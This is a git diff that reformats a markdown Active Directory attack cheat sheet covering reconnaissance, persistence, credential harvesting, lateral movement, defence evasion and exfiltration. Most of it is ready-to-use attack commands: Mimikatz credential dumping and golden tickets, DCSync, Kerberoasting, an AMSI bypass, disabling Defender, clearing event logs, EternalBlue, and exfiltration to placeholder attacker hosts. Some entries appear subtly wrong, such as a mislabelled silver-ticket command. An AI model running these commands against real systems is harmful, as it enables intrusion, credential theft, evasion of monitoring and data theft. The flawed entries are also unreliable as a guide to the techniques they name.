@@ -1,999 +1,894 @@
-# Index
-- [[Microsoft Active Directory (AD)]]
-	- [[Active Directory Cheat Sheet]]
-	- [[Kerberos Cheat Sheet]]
-	- [[LDAP Cheat Sheet]]
-	- [[MSSQL Cheat Sheet]]
-	- [[PowerShell Active Directory Cheat Sheet]]
+# Active Directory Cheat Sheet
 
-# 1. External Reconnaissance 
+## Index
 
-#### 1.1 Enumerate Domain Controllers 
+* \[\[Microsoft Active Directory (AD)]]
+  * \[\[Active Directory Cheat Sheet]]
+  * \[\[Kerberos Cheat Sheet]]
+  * \[\[LDAP Cheat Sheet]]
+  * \[\[MSSQL Cheat Sheet]]
+  * \[\[PowerShell Active Directory Cheat Sheet]]
 
-- **nmap**:
-    
+## 1. External Reconnaissance&#x20;
+
+**1.1 Enumerate Domain Controllers**&#x20;
+
+*   **nmap**:
+
     ```bash
     nmap -p <target_port> --script "ldap*,smb*,msrpc*,krb5-enum-users" -v -oA ldap-enum <target_ip>
     ```
-    
-- **rpcclient**:
-    
+*   **rpcclient**:
+
     ```bash
     rpcclient -U "" <target_ip>
     ```
-    
 
-#### 1.2 Enumerate Domain Information 
+**1.2 Enumerate Domain Information**&#x20;
 
-- **netdiscover (for Windows)**:
-    
+*   **netdiscover (for Windows)**:
+
     ```bash
     netdiscover -r <target_ip_range>
     ```
-    
-- **ldapsearch (Linux)**:
-    
+*   **ldapsearch (Linux)**:
+
     ```bash
     ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com"
     ```
-    
-- **PowerView (Windows)**:
-    
+*   **PowerView (Windows)**:
+
     ```powershell
     Import-Module PowerView
     Get-NetDomain
     Get-NetDomainController
     ```
-    
 
-#### 1.3 Gather Domain User Information 
+**1.3 Gather Domain User Information**&#x20;
 
-- **rpcclient**:
-    
+*   **rpcclient**:
+
     ```bash
     rpcclient -U "" <target_ip> -c "enumdomusers"
     ```
-    
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme smb <target_ip> -u '' -p '' --users
     ```
-    
-- **BloodHound**:
-    
+*   **BloodHound**:
+
     ```powershell
     Import-Module SharpHound
     Invoke-BloodHound -CollectionMethod All
     ```
-    
 
-#### 1.4 Enumerate GPOs (Group Policy Objects) 
+**1.4 Enumerate GPOs (Group Policy Objects)**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-NetGPO
     Get-NetGPO | %{Get-ObjectACL -DistinguishedName $_.distinguishedname -ResolveGUIDs}
     ```
-    
-- **GPOTool**:
-    
+*   **GPOTool**:
+
     ```bash
     gpotool /dc:<target_domain_controller>
     ```
-    
 
-#### 1.5 Enumerate Active Sessions 
+**1.5 Enumerate Active Sessions**&#x20;
 
-- **Logged On Users (PowerView)**:
-    
+*   **Logged On Users (PowerView)**:
+
     ```powershell
     Get-NetLoggedon -ComputerName <target_ip>
     ```
-    
-- **NetSessionEnum**:
-    
+*   **NetSessionEnum**:
+
     ```bash
     net session \\<target_ip>
     ```
-    
 
 **1.6 Enumerate Installed Software**:
 
-- **PowerUp**:
-    
+*   **PowerUp**:
+
     ```powershell
     Get-RemoteProgram -ComputerName <target_ip>
     ```
-    
-- **WMIC**:
-    
+*   **WMIC**:
+
     ```bash
     wmic /node:<target_ip> product get name, version
     ```
-    
 
-#### 1.6 Enumerate Local Admins 
+**1.6 Enumerate Local Admins**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-NetLocalGroup -ComputerName <target_ip> -GroupName Administrators
     ```
-    
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme smb <target_ip> -u <username> -p <password> --local-admins
     ```
-    
 
-#### 1.7 Enumerate Domain Admins 
+**1.7 Enumerate Domain Admins**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-NetGroupMember -GroupName "Domain Admins"
     ```
-    
 
-#### 1.8 Enumerate Shares 
+**1.8 Enumerate Shares**&#x20;
 
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme smb <target_ip> -u <username> -p <password> --shares
     ```
-    
-- **SMBClient**:
-    
+*   **SMBClient**:
+
     ```bash
     smbclient -L //<target_ip> -U <username>
     ```
-    
 
-#### 1.9 Enumerate DNS Records 
+**1.9 Enumerate DNS Records**&#x20;
 
-- **dnscmd (Windows)**:
-    
+*   **dnscmd (Windows)**:
+
     ```powershell
     dnscmd <target_ip> /enumrecords <zone_name> /type A
     ```
-    
-- **dnsrecon (Linux)**:
-    
+*   **dnsrecon (Linux)**:
+
     ```bash
     dnsrecon -d <domain> -t axfr
     ```
-    
 
-#### 1.10 Enumerate Kerberos Tickets 
+**1.10 Enumerate Kerberos Tickets**&#x20;
 
-- **Rubeus**:
-    
+*   **Rubeus**:
+
     ```powershell
     Rubeus.exe dump
     ```
-    
 
-#### 1.11 Enumerate AD Trusts 
+**1.11 Enumerate AD Trusts**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-NetDomainTrust
     ```
-    
 
-#### 1.12 Enumerate LAPS (Local Administrator Password Solution) 
+**1.12 Enumerate LAPS (Local Administrator Password Solution)**&#x20;
 
-- **Get-LAPS**:
-    
+*   **Get-LAPS**:
+
     ```powershell
     Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd
     ```
-    
 
-# 2. Initial Access 
+## 2. Initial Access&#x20;
 
-# 3. Persistence 
+## 3. Persistence&#x20;
 
-#### 3.1 Golden Ticket Attack 
+**3.1 Golden Ticket Attack**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
     ```
-    
 
-#### 3.2 Silver Ticket Attack 
+**3.2 Silver Ticket Attack**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     tgt::deleg /domain:<domain> /sid:<SID> /target:<target_server> /rc4:<NTLM hash> /user:<username> /service:krbtgt
     ```
-    
 
-#### 3.3 Skeleton Key Attack 
+**3.3 Skeleton Key Attack**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     privilege::debug
     misc::skeleton
     ```
-    
 
-#### 3.4 Backdooring User Accounts 
+**3.4 Backdooring User Accounts**&#x20;
 
-- **Invoke-UserBackdoor**:
-    
+*   **Invoke-UserBackdoor**:
+
     ```powershell
     Invoke-UserBackdoor -UserName <username> -NewPass <password>
     ```
-    
 
-#### 3.5 Backdoor Accounts via ACLs 
+**3.5 Backdoor Accounts via ACLs**&#x20;
 
-- **Set DACL to Grant Attacker Control**:
-    
+*   **Set DACL to Grant Attacker Control**:
+
     ```powershell
     Add-DomainObjectAcl -TargetIdentity <target_account> -PrincipalIdentity <attacker_user> -Rights All
     ```
-    
 
-#### 3.6 Persistence via Malicious GPOs 
+**3.6 Persistence via Malicious GPOs**&#x20;
 
-- **Deploy Malicious GPO**:
-    
+*   **Deploy Malicious GPO**:
+
     ```powershell
     Invoke-GPOInstall -Path \\<domain>\SYSVOL\<domain>\Policies\{GPO_GUID}\Machine\Scripts\Startup
     ```
-    
 
-# 4. Credential Harvesting 
+## 4. Credential Harvesting&#x20;
 
-#### 4.1 Brute Forcing 
+**4.1 Brute Forcing**&#x20;
 
-- **THC-Hydra**:
-    
+*   **THC-Hydra**:
+
     ```bash
     hydra -l <username> -P /path/to/passwords.txt smb://<target_ip>
     ```
-    
 
-#### 4.2 Password Spraying 
+**4.2 Password Spraying**&#x20;
 
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme smb <target_ip_range> -u username_list.txt -p password
     ```
-    
-- **Kerbrute (for Kerberos)**:
-    
+*   **Kerbrute (for Kerberos)**:
+
     ```bash
     ./kerbrute -domain domain.com -users users.txt -passwords passwords.txt -threads 5
     ```
-    
 
-#### 4.3 Extract Password Hashes 
+**4.3 Extract Password Hashes**&#x20;
 
-- **SecretsDump (Impacket)**:
-    
+*   **SecretsDump (Impacket)**:
+
     ```bash
     secretsdump.py <domain>/<username>:<password>@<target_ip>
     ```
-    
-- **Mimikatz (Windows)**:
-    
+*   **Mimikatz (Windows)**:
+
     ```powershell
     mimikatz # sekurlsa::logonpasswords
     ```
-    
 
-#### 4.4 Dump Credentials from LSASS 
+**4.4 Dump Credentials from LSASS**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     sekurlsa::logonpasswords
     ```
-    
-- **Procdump (Windows)**:
-    
+*   **Procdump (Windows)**:
+
     ```bash
     procdump64.exe -ma lsass.exe lsass.dmp
     ```
-    
 
-#### 4.5 Dump Cached Credentials 
+**4.5 Dump Cached Credentials**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     sekurlsa::logonpasswords /patch
     ```
-    
 
-#### 4.6 Dump NTDS.dit 
+**4.6 Dump NTDS.dit**&#x20;
 
-- **ntdsutil (Windows)**:
-    
+*   **ntdsutil (Windows)**:
+
     ```bash
     ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
     ```
-    
-- **Impacket's secretsdump**:
-    
+*   **Impacket's secretsdump**:
+
     ```bash
     secretsdump.py -just-dc <domain>/<username>:<password>@<target_ip>
     ```
-    
 
-# 5. Privilege Escalation 
+## 5. Privilege Escalation&#x20;
 
-#### 5.1 Pass-the-Hash Attack 
+**5.1 Pass-the-Hash Attack**&#x20;
 
-- **Pass-the-Hash with Mimikatz**:
-    
+*   **Pass-the-Hash with Mimikatz**:
+
     ```powershell
     sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe
     ```
-    
 
-#### 5.2 Kerberoasting 
+**5.2 Kerberoasting**&#x20;
 
-- **Invoke-Kerberoast**:
-    
+*   **Invoke-Kerberoast**:
+
     ```powershell
     Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt
     ```
-    
-- **Rubeus**:
-    
+*   **Rubeus**:
+
     ```powershell
     Rubeus.exe kerberoast
     ```
-    
-- **Request and Crack Service Tickets**:
-    
+*   **Request and Crack Service Tickets**:
+
     ```bash
     GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
     hashcat -m 13100 <hash> /path/to/wordlist.txt
     ```
-    
 
-#### 5.3 Abusing GPOs (Group Policy Objects) 
+**5.3 Abusing GPOs (Group Policy Objects)**&#x20;
 
-- **SharpGPOAbuse**:
-    
+*   **SharpGPOAbuse**:
+
     ```powershell
     SharpGPOAbuse -AddUserToLocalGroup -UserAccount your_user -GroupName "Administrators" -GPOName "Default Domain Policy"
     ```
-    
 
-#### 5.4 Abusing Group Policy Preferences (GPP) 
+**5.4 Abusing Group Policy Preferences (GPP)**&#x20;
 
-- **gpp-decrypt (Linux)**:
-    
+*   **gpp-decrypt (Linux)**:
+
     ```bash
     gpp-decrypt <cpassword>
     ```
-    
+
     Decrypting passwords stored in GPP.
 
-#### 5.5 DCSync Attack (Replicating Directory) 
+**5.5 DCSync Attack (Replicating Directory)**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     lsadump::dcsync /user:<domain>\<username>
     ```
-    
-- **Impacket’s secretsdump.py**:
-    
+*   **Impacket’s secretsdump.py**:
+
     ```bash
     secretsdump.py -just-dc <domain>/<username>:<password>@<target_ip>
     ```
-    
 
-#### 5.6 Exploiting Misconfigured Services 
+**5.6 Exploiting Misconfigured Services**&#x20;
 
-- **PowerUp (Windows)**:
-    
+*   **PowerUp (Windows)**:
+
     ```powershell
     Import-Module PowerUp
     Invoke-AllChecks
     ```
-    
 
-#### 5.7 Abusing Unconstrained Delegation 
+**5.7 Abusing Unconstrained Delegation**&#x20;
 
-- **Mimikatz (Windows)**:
-    
+*   **Mimikatz (Windows)**:
+
     ```powershell
     mimikatz # sekurlsa::tickets
     ```
-    
-- **Impacket’s GetUserSPNs.py**:
-    
+*   **Impacket’s GetUserSPNs.py**:
+
     ```bash
     GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
     ```
-    
 
-#### 5.8 Abusing TrustedForDelegation Privilege 
+**5.8 Abusing TrustedForDelegation Privilege**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-DomainUser -TrustedToAuth
     Get-DomainComputer -TrustedToAuth
     ```
-    
 
-#### 5.9 Token Impersonation (Windows) 
+**5.9 Token Impersonation (Windows)**&#x20;
 
-- **Incognito (Windows)**:
-    
+*   **Incognito (Windows)**:
+
     ```powershell
     token::elevate
     ```
-    
 
-#### 5.10 Abusing Service Accounts 
+**5.10 Abusing Service Accounts**&#x20;
 
-- **Kerberoasting with Rubeus**:
-    
+*   **Kerberoasting with Rubeus**:
+
     ```powershell
     Rubeus.exe kerberoast
     ```
-    
+
     Crack the ticket with Hashcat:
-    
+
     ```bash
     hashcat -m 13100 <ticket_hash> /path/to/wordlist.txt
     ```
-    
 
-#### 5.11 Abusing DNSAdmins 
+**5.11 Abusing DNSAdmins**&#x20;
 
-- **Abuse DNSAdmin Privilege**: Load malicious DLL via DNSAdmins privilege.
-    
+*   **Abuse DNSAdmin Privilege**: Load malicious DLL via DNSAdmins privilege.
+
     ```powershell
     dnscmd <target_ip> /config /serverlevelplugindll \\<attacker_ip>\share\dll
     ```
-    
 
-#### 5.12 Abusing Passwords in SYSVOL 
+**5.12 Abusing Passwords in SYSVOL**&#x20;
 
-- **GPP Password Decryption**:
-    
+*   **GPP Password Decryption**:
+
     ```bash
     gpp-decrypt <cpassword>
     ```
-    
 
-#### 5.13 Exploiting Weak ACLs 
+**5.13 Exploiting Weak ACLs**&#x20;
 
-- **Abuse WriteDACL Permissions**:
-    
+*   **Abuse WriteDACL Permissions**:
+
     ```powershell
     Add-DomainObjectAcl -TargetIdentity <target_object> -PrincipalIdentity <attacker_user> -Rights DCSync
     ```
-    
 
-# 6. Internal Reconnaissance 
+## 6. Internal Reconnaissance&#x20;
 
-#### 6.1 Data Extraction 
+**6.1 Data Extraction**&#x20;
 
-- **SharpHound (BloodHound)**:
-    
+*   **SharpHound (BloodHound)**:
+
     ```powershell
     Invoke-BloodHound -CollectionMethod All
     ```
-    
 
-#### 6.2 Sensitive File Searching 
+**6.2 Sensitive File Searching**&#x20;
 
-- **Invoke-FileFinder**:
-    
+*   **Invoke-FileFinder**:
+
     ```powershell
     Invoke-FileFinder -SearchWordList passwords.txt
     ```
-    
 
-# 7. Lateral Movement, Pivoting, and Tunnelling 
+## 7. Lateral Movement, Pivoting, and Tunnelling&#x20;
 
-#### 7.1 Pass-the-Hash (PtH) 
+**7.1 Pass-the-Hash (PtH)**&#x20;
 
-- **Impacket’s WMIExec**:
-    
+*   **Impacket’s WMIExec**:
+
     ```bash
     wmiexec.py <domain>/<username>:<NTLM_hash>@<target_ip>
     ```
-    
-- **Evil-WinRM**:
-    
+*   **Evil-WinRM**:
+
     ```bash
     evil-winrm -i <target_ip> -u <username> -H <NTLM_hash>
     ```
-    
 
-#### 7.2 Overpass-the-Hash (Pass-the-Key) 
+**7.2 Overpass-the-Hash (Pass-the-Key)**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /rc4:<NTLM_hash> /run:cmd.exe
     ```
-    
 
-#### 7.3 Pass-the-Ticket (PTT) Attack 
+**7.3 Pass-the-Ticket (PTT) Attack**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     kerberos::ptt <ticket.kirbi>
     ```
-    
+
     Use this command after extracting a TGT or TGS ticket to impersonate a user on the domain.
 
-#### 7.4 Lateral Movement via SSH 
+**7.4 Lateral Movement via SSH**&#x20;
 
-- **SSHPass (Linux)**:
-    
+*   **SSHPass (Linux)**:
+
     ```bash
     sshpass -p <password> ssh <username>@<target_ip>
     ```
-    
 
-#### 7.5 Remote Desktop Protocol (RDP) 
+**7.5 Remote Desktop Protocol (RDP)**&#x20;
 
-- **rdesktop**:
-    
+*   **rdesktop**:
+
     ```bash
     rdesktop -u <username> -p <password> <target_ip>
     ```
-    
-- **xfreerdp (Linux)**:
-    
+*   **xfreerdp (Linux)**:
+
     ```bash
     xfreerdp /u:<username> /p:<password> /v:<target_ip>
     ```
-    
 
-#### 7.6 Lateral Movement via SMB 
+**7.6 Lateral Movement via SMB**&#x20;
 
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme smb <target_ip> -u <username> -H <NTLM_hash> -x <command>
     ```
-    
-- **PsExec (Impacket)**:
-    
+*   **PsExec (Impacket)**:
+
     ```bash
     psexec.py <domain>/<username>:<password>@<target_ip> cmd.exe
     ```
-    
 
-#### 7.7 Lateral Movement via PSExec 
+**7.7 Lateral Movement via PSExec**&#x20;
 
-- **PsExec**:
-    
+*   **PsExec**:
+
     ```bash
     psexec.py <domain>/<username>:<password>@<target_ip>
     ```
-    
 
-#### 7.8 Lateral Movement via WMIExec 
+**7.8 Lateral Movement via WMIExec**&#x20;
 
-- **WMIExec (Impacket)**:
-    
+*   **WMIExec (Impacket)**:
+
     ```bash
     wmiexec.py <domain>/<username>:<password>@<target_ip>
     ```
-    
-- **Invoke-WmiMethod (PowerShell)**:
-    
+*   **Invoke-WmiMethod (PowerShell)**:
+
     ```powershell
     Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>" -ComputerName <target_ip>
     ```
-    
 
-#### 7.9 Lateral Movement via DCOM 
+**7.9 Lateral Movement via DCOM**&#x20;
 
-- **Invoke-DCOM (PowerShell)**:
-    
+*   **Invoke-DCOM (PowerShell)**:
+
     ```powershell
     Invoke-DCOM -ComputerName <target_ip> -Method ShellExecute -Command "powershell.exe"
     ```
-    
 
-#### 7.10 SMB Relay Attack 
+**7.10 SMB Relay Attack**&#x20;
 
-- **Impacket’s ntlmrelayx**:
-    
+*   **Impacket’s ntlmrelayx**:
+
     ```bash
     ntlmrelayx.py -tf targets.txt -smb2support
     ```
-    
 
-# 8. Defense Evasion 
+## 8. Defense Evasion&#x20;
 
-#### 8.1 Clearing Event Logs 
+**8.1 Clearing Event Logs**&#x20;
 
-- **Wevtutil**:
-    
+*   **Wevtutil**:
+
     ```powershell
     wevtutil cl System
     wevtutil cl Security
     wevtutil cl Application
     ```
-    
 
-#### 8.2 Disabling Security Tools 
+**8.2 Disabling Security Tools**&#x20;
 
-- **Invoke-Obfuscation (PowerShell)**:
-    
+*   **Invoke-Obfuscation (PowerShell)**:
+
     ```powershell
     Invoke-Obfuscation -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
     ```
-    
 
-#### 8.3 Process Injection 
+**8.3 Process Injection**&#x20;
 
-- **Invoke-ReflectivePEInjection**:
-    
+*   **Invoke-ReflectivePEInjection**:
+
     ```powershell
     Invoke-ReflectivePEInjection -PEBytes (Get-Content calc.exe -Raw) -ProcID <PID>
     ```
-    
 
-#### 8.4 UAC Bypass 
+**8.4 UAC Bypass**&#x20;
 
-- **UACMe**:
-    
+*   **UACMe**:
+
     ```powershell
     .\uacme.exe
     ```
-    
 
-#### 8.5 Bypass PowerShell Script Block Logging 
+**8.5 Bypass PowerShell Script Block Logging**&#x20;
 
-- **Obfuscate PowerShell Scripts**:
-    
+*   **Obfuscate PowerShell Scripts**:
+
     ```powershell
     Invoke-Obfuscation
     ```
-    
 
-#### 8.6 Bypass AMSI (Antimalware Scan Interface) 
+**8.6 Bypass AMSI (Antimalware Scan Interface)**&#x20;
 
-- **AMSI Bypass in PowerShell**:
-    
+*   **AMSI Bypass in PowerShell**:
+
     ```powershell
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
     ```
-    
 
-#### 8.7 Evade UAC (User Account Control) 
+**8.7 Evade UAC (User Account Control)**&#x20;
 
-- **UACMe (Windows)**:
-    
+*   **UACMe (Windows)**:
+
     ```powershell
     .\uacme.exe
     ```
-    
 
-#### 8.8 Bypass Network Access Controls 
+**8.8 Bypass Network Access Controls**&#x20;
 
-- **Pivoting with SSH Tunnels**:
-    
+*   **Pivoting with SSH Tunnels**:
+
     ```bash
     ssh -L <local_port>:<target_ip>:<target_port> <attacker_ip>
     ```
-    
-- **VPN Pivoting**:
-    
+*   **VPN Pivoting**:
+
     ```bash
     openvpn --config <vpn_config.ovpn>
     ```
-    
 
-# 9. Data Exfiltration 
+## 9. Data Exfiltration&#x20;
 
-#### 9.1 Data Exfiltration via HTTPS 
+**9.1 Data Exfiltration via HTTPS**&#x20;
 
-- **Invoke-WebRequest (PowerShell)**:
-    
+*   **Invoke-WebRequest (PowerShell)**:
+
     ```powershell
     $data = Get-Content C:\SensitiveData.txt
     Invoke-WebRequest -Uri https://<attacker_server>/upload -Method POST -Body $data
     ```
-    
 
-#### 9.2 Exfiltration via DNS 
+**9.2 Exfiltration via DNS**&#x20;
 
-- **DnsExfiltrator**:
-    
+*   **DnsExfiltrator**:
+
     ```bash
     dnsexfiltrator -i ens33 -d attacker.com -f /etc/passwd
     ```
-    
-- **Dnscat2**:
-    
+*   **Dnscat2**:
+
     ```bash
     dnscat2-client <target_domain>
     ```
-    
 
-#### 9.3 Exfiltration via SMB** 
+**9.3 Exfiltration via SMB\*\***&#x20;
 
-- **SMBClient**:
-    
+*   **SMBClient**:
+
     ```bash
     smbclient //target/share -U <username> -c 'prompt off; mget *'
     ```
-    
 
-#### 9.4 Data Exfiltration via ICMP 
+**9.4 Data Exfiltration via ICMP**&#x20;
 
-- **PowerShell (Invoke-PingExfil)**:
-    
+*   **PowerShell (Invoke-PingExfil)**:
+
     ```powershell
     Invoke-PingExfil -FilePath C:\sensitive_data.txt -DestinationIP <attacker_ip>
     ```
-    
 
-#### 9.4 Exfiltration via Rclone 
+**9.4 Exfiltration via Rclone**&#x20;
 
-- **Exfil with Rclone**:
-    
+*   **Exfil with Rclone**:
+
     ```bash
     rclone copy /path/to/data remote:bucket
     ```
-    
 
-# 10. Reporting and Cleanup 
+## 10. Reporting and Cleanup&#x20;
 
-#### 10.1 Generate Comprehensive Report 
+**10.1 Generate Comprehensive Report**&#x20;
 
-- **Dradis Framework**:
-    
+*   **Dradis Framework**:
+
     ```bash
     dradis
     ```
-    
+
     Useful for organizing findings and generating reports.
 
-#### 10.2 Remove Tools and Artifacts 
+**10.2 Remove Tools and Artifacts**&#x20;
 
-- **PowerShell**:
-    
+*   **PowerShell**:
+
     ```powershell
     Remove-Item -Path C:\Temp\* -Recurse
     Clear-History
     ```
-    
 
-#### 10.3 Reset Permissions 
+**10.3 Reset Permissions**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Invoke-ACLReset -Path "CN=AdminSDHolder,CN=System,DC=domain,DC=com"
     ```
-    
 
-#### 10.4 Log Out and End Session 
+**10.4 Log Out and End Session**&#x20;
 
-- **PowerShell**:
-    
+*   **PowerShell**:
+
     ```powershell
     Stop-Process -Name explorer
     ```
-    
 
-# 11. Attack Techniques on Specific AD Services 
+## 11. Attack Techniques on Specific AD Services&#x20;
 
-## 11.2 LDAP 
+### 11.2 LDAP&#x20;
 
-#### 11.1.1 LDAP (Lightweight Directory Access Protocol) 
+**11.1.1 LDAP (Lightweight Directory Access Protocol)**&#x20;
 
-- **ldapsearch**:
-    
+*   **ldapsearch**:
+
     ```bash
     ldapsearch -x -H ldap://<target_ip> -b "dc=domain,dc=com"
     ```
-    
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme ldap <target_ip> -u <username> -p <password> -M ldap_search -o "base=DC=domain,DC=com"
     ```
-    
 
-## 11.2 SMB 
+### 11.2 SMB&#x20;
 
-#### 11.2.1 SMB (Server Message Block) 
+**11.2.1 SMB (Server Message Block)**&#x20;
 
-- **EternalBlue Exploit (Metasploit)**:
-    
+*   **EternalBlue Exploit (Metasploit)**:
+
     ```bash
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS <target_ip>
     run
     ```
-    
 
-## 11.3 RPC 
+### 11.3 RPC&#x20;
 
-#### 11.3.1 RPC (Remote Procedure Call) 
+**11.3.1 RPC (Remote Procedure Call)**&#x20;
 
-- **rpcclient**:
-    
+*   **rpcclient**:
+
     ```bash
     rpcclient -U "<username>%<password>" <target_ip> -c "enumdomusers"
     ```
-    
 
-## 11.4 MSSQL 
+### 11.4 MSSQL&#x20;
 
-#### 11.4.1 MSSQL Server 
+**11.4.1 MSSQL Server**&#x20;
 
-- **SQLCMD (Linux)**:
-    
+*   **SQLCMD (Linux)**:
+
     ```bash
     sqlcmd -S <target_ip> -U <username> -P <password>
     ```
-    
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme mssql <target_ip> -u <username> -p <password> --xp_cmdshell
     ```
-    
 
-## 11.5 RPD 
+### 11.5 RPD&#x20;
 
-#### 11.5.1 RDP (Remote Desktop Protocol) 
+**11.5.1 RDP (Remote Desktop Protocol)**&#x20;
 
-- **RDP Client (Linux)**:
-    
+*   **RDP Client (Linux)**:
+
     ```bash
     rdesktop -u <username> -p <password> <target_ip>
     ```
-    
-- **CrackMapExec (CME)**:
-    
+*   **CrackMapExec (CME)**:
+
     ```bash
     cme rdp <target_ip> -u <username> -p <password> --exec "powershell.exe"
     ```
-    
 
-## 11.6 Kerberos 
+### 11.6 Kerberos&#x20;
 
-#### 11.6.1 Kerberos Service Ticket Enumeration 
+**11.6.1 Kerberos Service Ticket Enumeration**&#x20;
 
-- **GetUserSPNs (Impacket)**:
-    
+*   **GetUserSPNs (Impacket)**:
+
     ```bash
     GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
     ```
-    
 
-#### 11.6.2 AS-REP Roasting 
+**11.6.2 AS-REP Roasting**&#x20;
 
-- **Rubeus**:
-    
+*   **Rubeus**:
+
     ```powershell
     Rubeus.exe asreproast /user:<username>
     ```
-    
+
     Crack with Hashcat:
-    
+
     ```bash
     hashcat -m 18200 <asrep_hash> /path/to/wordlist.txt
     ```
-    
 
-#### 11.6.3 Constrained Delegation Abuse 
+**11.6.3 Constrained Delegation Abuse**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-DomainUser -TrustedToAuth
     Set-DomainObject -Identity "<computer_account>" -Set @{msDS-AllowedToDelegateTo="HOST/<target_service>"}
     ```
-    
-- **S4U2Self Attack (Rubeus)**:
-    
+*   **S4U2Self Attack (Rubeus)**:
+
     ```powershell
     Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:<target_user> /msdsspn:<target_service>
     ```
-    
 
-#### 11.6.4 Kerberos Unconstrained Delegation 
+**11.6.4 Kerberos Unconstrained Delegation**&#x20;
 
-- **Rubeus**:
-    
+*   **Rubeus**:
+
     ```powershell
     Rubeus.exe tgtdeleg /target:<target_computer>
     ```
-    
 
-# 12. Domain Trust Exploitation 
+## 12. Domain Trust Exploitation&#x20;
 
-#### 12.1 Enumerating Trusts 
+**12.1 Enumerating Trusts**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Get-NetForest
     Get-NetForestDomain
     Get-NetDomainTrust
     Get-NetForestTrust
     ```
-    
 
-#### 12.2 Exploiting Inter-Trust Relationships 
+**12.2 Exploiting Inter-Trust Relationships**&#x20;
 
-- **ADExplorer**: Enumerate trust relationships and attack via SID History.
-- **BloodHound**:
-    
+* **ADExplorer**: Enumerate trust relationships and attack via SID History.
+*   **BloodHound**:
+
     ```powershell
     Invoke-BloodHound -CollectionMethod Trusts
     ```
-    
 
-#### 12.3 Abusing SID History 
+**12.3 Abusing SID History**&#x20;
 
-- **Mimikatz**:
-    
+*   **Mimikatz**:
+
     ```powershell
     kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID>-500 /sids:<target_domain_SID>-519 /krbtgt:<NTLM_hash> /target:<target_domain> /rc4:<NTLM_hash>
     ```
-    
 
-# 13. Domain Persistence Techniques 
+## 13. Domain Persistence Techniques&#x20;
 
-#### 13.1 Persistence via AdminSDHolder 
+**13.1 Persistence via AdminSDHolder**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Set-DomainObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Set @{msds-allowedtoactonbehalfofotheridentity=Get-ACL}
     ```
-    
 
-#### 13.2 Persistence via SID History 
+**13.2 Persistence via SID History**&#x20;
 
-- **Invoke-SIDHistoryInjection**:
-    
+*   **Invoke-SIDHistoryInjection**:
+
     ```powershell
     Invoke-SIDHistoryInjection -UserName <target_user> -SIDHistory <SID_to_inject>
     ```
-    
 
-#### 13.3 Backdooring Accounts via ACLs 
+**13.3 Backdooring Accounts via ACLs**&#x20;
 
-- **PowerView**:
-    
+*   **PowerView**:
+
     ```powershell
     Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <AttackerUser> -Rights DCSync
     ```
-    
 
-#### 13.4 ACL Abuse for Persistence 
+**13.4 ACL Abuse for Persistence**&#x20;
 
-- **Aclpwn.py**:
-    
+*   **Aclpwn.py**:
+
     ```bash
     aclpwn --domain <domain> --username <username> --password <password> --command-backdoor --target <target_user>
     ```
